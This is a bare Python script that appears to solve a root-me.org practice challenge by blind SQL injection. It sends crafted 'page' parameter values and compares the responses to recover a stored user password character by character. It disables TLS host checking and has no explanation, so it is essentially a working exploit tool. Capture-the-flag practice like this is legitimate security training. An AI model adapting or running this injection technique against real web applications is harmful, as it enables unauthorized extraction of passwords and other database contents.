#!/usr/bin/python

import io
import re
import pycurl
import StringIO
from urllib import urlencode


def clear(o):
    o.truncate(0)
    o.seek(0)

body_buffer = StringIO.StringIO()
header_buffer = StringIO.StringIO()


c = pycurl.Curl()
c.setopt(c.SSL_VERIFYHOST, 0)
c.setopt(c.WRITEFUNCTION, body_buffer.write)
c.setopt(c.HEADERFUNCTION, header_buffer.write)

found = True
passwd = ''
cur = 1
while found:
    found = False
    for i in range(33,128):
        c.setopt(c.URL, 'http://challenge01.root-me.org/realiste/ch10/?page=((ord(substr(user_password,'+str(cur)+',1)))%2f'+str(i)+')%2b1')
        c.perform()

        body = body_buffer.getvalue()
        header = header_buffer.getvalue()

        if len(body.split('No such article')) <= 1 and len(body.split('All about RSA')) > 1:
            if chr(i) == '$':
                print(body)
                exit()
            #print(header)
            print(i, chr(i))
            found = True
            passwd += chr(i)
            break

        clear(body_buffer)
        clear(header_buffer)
    print(passwd)
    cur += 1

print(passwd)
